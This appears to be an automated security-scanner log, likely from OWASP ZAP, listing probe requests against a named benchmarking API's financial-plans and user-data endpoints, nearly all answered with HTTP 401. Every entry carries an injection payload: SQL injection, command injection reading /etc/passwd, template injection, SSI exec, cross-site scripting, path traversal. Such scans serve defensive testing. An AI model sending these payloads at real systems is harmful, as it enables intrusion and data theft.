* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+AND+%25271%2527%253D%25271%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+AND+%25271%2527%253D%25272%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+OR+%25271%2527%253D%25271%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2529+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%253Bcat+%252Fetc%252Fpasswd%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%253Bget-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%253Bget-help+%2523
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%253Bsleep+15.0%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%253Bstart-sleep+-s+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%253Bstart-sleep+-s+15.0+%2523
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%257Ctimeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns&class.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+%252F+sleep%252815%2529+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+AND+1%253D1+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+AND+1%253D2+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+or+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+OR+1%253D1+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns0W45pz4p
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=WEB-INF%252Fweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=WEB-INF%255Cweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=www.google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=www.google.com%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=www.google.com%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=www.google.com%253A80%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=www.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=ZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zApPX45sS
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%2523%257B6856*3092%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%2523set%2528%2524x%253D1861*5972%2529%2524%257Bx%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%2524%257B3330*3462%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%253C%2525%253D6707*4980%2525%253Ezj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%253Cp+th%253Atext%253D%2522%2524%257B9824*5897%257D%2522%253E%253C%252Fp%253Ezj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%257B%25236072*7262%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%257B%25403248*5776%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%257B%2540math+key%253D%25224152%2522+method%253D%2522multiply%2522+operand%253D%25225713%2522%252F%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%257B%257B%253D2695*3838%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%257B%257B3343*1807%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%257B%257B45310%257Cadd%253A66990%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%257B%257Bprint+%25221182%2522+%25223292%2522%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj%257B2279*8629%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=zj+8565*1402+zj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E&organisationId=organisationId&organisationType=school&status=pending&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=%253Cscript%253Ealert(1&29%253C/script%253E&organisationId=organisationId&organisationType=school&status=pending&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E&organisationType=school&status=pending&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=%253Cscript%253Ealert(1&29%253C/script%253E&organisationType=school&status=pending&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=javascript:alert(1&29&organisationType=school&status=pending&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E&status=pending&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=%253Cscript%253Ealert(1&29%253C/script%253E&status=pending&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=javascript:alert(1&29&status=pending&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=school&status=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=school&status=%253Cscript%253Ealert(1&29%253C/script%253E&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=school&status=javascript:alert(1&29&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=school&status=pending&type=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=school&status=pending&type=%253Cscript%253Ealert(1&29%253C/script%253E&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=school&status=pending&type=comparator-set&userId=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=school&status=pending&type=comparator-set&userId=%253Cscript%253Ealert(1&29%253C/script%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=school&status=pending&type=comparator-set&userId=javascript:alert(1&29
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=id&organisationId=organisationId&organisationType=school&status=pending&type=javascript:alert(1&29&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3Fid=javascript:alert(1&29&organisationId=organisationId&organisationType=school&status=pending&type=comparator-set&userId=userId
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522%252Bresponse.write%2528884%252C889*897%252C447%2529%252B%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522%252F%253E%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2522java.lang.Thread.sleep%2522%252815000%2529&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2523%257B%2525x%2528sleep+15%2529%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
